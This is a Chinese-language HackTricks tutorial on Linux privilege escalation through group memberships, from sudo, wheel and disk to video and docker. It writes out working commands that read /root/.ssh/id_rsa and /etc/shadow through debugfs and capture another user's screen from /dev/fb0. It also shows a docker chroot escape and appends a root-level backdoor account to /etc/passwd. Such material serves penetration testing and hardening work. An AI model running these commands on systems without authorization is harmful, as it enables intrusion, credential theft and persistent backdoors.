# 有趣的组 - Linux提权

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## Sudo/Admin 组

### **PE - 方法1**

**有时**，**默认情况下（或因为某些软件需要）**，您可以在**/etc/sudoers**文件中找到以下一些行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着**任何属于sudo或admin组的用户都可以作为sudo执行任何操作**。

如果是这种情况，要**成为root用户，只需执行**：
```
sudo su
```
### 提权 - 方法 2

查找所有SUID二进制文件，并检查是否存在二进制文件 **Pkexec**：
```bash
find / -perm -4000 2>/dev/null
```
如果发现二进制文件 **pkexec 是 SUID 二进制文件**，并且你属于 **sudo** 或 **admin** 组，那么可能可以使用 `pkexec` 以 sudo 权限执行二进制文件。\
这是因为通常这些组是 **polkit 策略** 中的组。该策略基本上标识了哪些组可以使用 `pkexec`。使用以下命令检查：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在这里，您将找到有权执行**pkexec**和**默认情况下**在某些Linux发行版中出现的组**sudo**和**admin**。

要**成为root用户，您可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果尝试执行**pkexec**时出现以下**错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你没有连接到图形界面**。这里有一个解决此问题的方法：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要**2个不同的ssh会话**：

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**有时候**，**默认情况下**，您可以在**/etc/sudoers**文件中找到这行：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着**任何属于wheel组的用户都可以作为sudo执行任何操作**。

如果是这种情况，要**成为root用户，只需执行**：
```
sudo su
```
## 阴影组

来自**阴影组**的用户可以**读取**`/etc/shadow`文件：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## 磁盘组

这个权限几乎等同于root访问权限，因为您可以访问机器内部的所有数据。

文件：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用debugfs，您也可以**写入文件**。例如，要将`/tmp/asd1.txt`复制到`/tmp/asd2.txt`，您可以执行以下操作：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
然而，如果您尝试**编写属于root的文件**（如`/etc/shadow`或`/etc/passwd`），您将收到“**Permission denied**”错误。

## 视频组

使用命令`w`，您可以找到**谁登录到系统**，并且它将显示以下输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 物理登录** 到机器上的终端。

**video 组** 具有查看屏幕输出的权限。基本上，您可以观察屏幕。为了做到这一点，您需要以原始数据的形式 **获取屏幕上的当前图像** 并获取屏幕正在使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，您可以在 `/sys/class/graphics/fb0/virtual_size` 中找到此屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**打开**原始图像，您可以使用**GIMP**，选择\*\*`screen.raw` \*\*文件，并选择文件类型为**原始图像数据**：

![](<../../../.gitbook/assets/image (287) (1).png>)

然后修改宽度和高度为屏幕上使用的值，并检查不同的图像类型（选择显示屏幕效果最好的那种）：

![](<../../../.gitbook/assets/image (288).png>)

## Root组

看起来默认情况下，**root组的成员**可能可以访问**修改**一些**服务**配置文件或一些**库**文件或**其他有趣的东西**，这些可能被用来提升权限...

**检查root成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 组

您可以将主机机器的根文件系统挂载到实例的卷上，因此当实例启动时，它会立即将 `chroot` 加载到该卷中。这实际上让您在该机器上获得了 root 权限。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## 有趣的Linux特权升级组

最后，如果您不喜欢之前的任何建议，或者由于某种原因（比如docker api防火墙？），您可以尝试**运行一个特权容器并从中逃逸**，如此处所述：

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

如果您对docker套接字具有写权限，请阅读[**这篇关于如何滥用docker套接字提升权限的帖子**](../#writable-docker-socket)**。**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd组

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm组

通常，**`adm`**组的**成员**具有**读取**位于 _/var/log/_ 中的日志文件的权限。\
因此，如果您已经入侵了此组中的用户，您应该绝对**查看日志**。

## Auth组

在OpenBSD中，**auth**组通常可以写入 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹（如果使用）。\
可以使用以下漏洞利用来滥用这些权限以**提升权限**到root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
